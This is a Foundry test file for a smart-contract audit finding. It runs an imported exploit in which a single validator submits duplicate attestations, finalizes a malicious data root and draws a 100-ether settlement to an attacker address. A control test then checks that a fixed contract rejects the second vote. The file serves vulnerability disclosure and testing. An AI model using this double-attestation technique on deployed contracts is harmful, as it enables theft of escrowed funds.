// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, RewardToken, DataMarketFixed} from "./58812-validators-can-submit-multiple-attestations-to-maliciously-f.sol";

contract Finding58812Test is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    function test_exploit_one_validator_finalizes() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.paid(), 100 ether, "settlement released");
        assertEq(e.reward().balanceOf(ATTACKER), 100 ether, "attacker received settlement");
        bytes32 batch = keccak256(abi.encode(address(0xA11), "QmbWqxBEKC3P8tqsKc98xmWNzrzDtRLMiMPL8wBuTGsMnX", uint256(1)));
        assertEq(e.market().votes(batch, keccak256("test-hash1")), 2, "two votes from one validator");
        assertTrue(e.market().finalized(batch), "malicious root finalized");
    }

    function test_control_second_vote_reverts() public {
        RewardToken reward = new RewardToken();
        DataMarketFixed market = new DataMarketFixed(reward);
        market.addValidator(address(this));
        bytes32 root = keccak256("test-hash1");
        market.submitBatchAttestation(address(0xA11), "QmbWqxBEKC3P8tqsKc98xmWNzrzDtRLMiMPL8wBuTGsMnX", 1, root);
        bool reverted;
        try market.submitBatchAttestation(address(0xA11), "QmbWqxBEKC3P8tqsKc98xmWNzrzDtRLMiMPL8wBuTGsMnX", 1, root) {
            reverted = false;
        } catch {
            reverted = true;
        }
        assertTrue(reverted, "second attestation rejected");
        assertFalse(market.finalized(), "not finalized");
        assertEq(reward.balanceOf(address(this)), 0, "no settlement");
        assertEq(reward.balanceOf(address(market)), 100 ether, "escrow intact");
    }
}
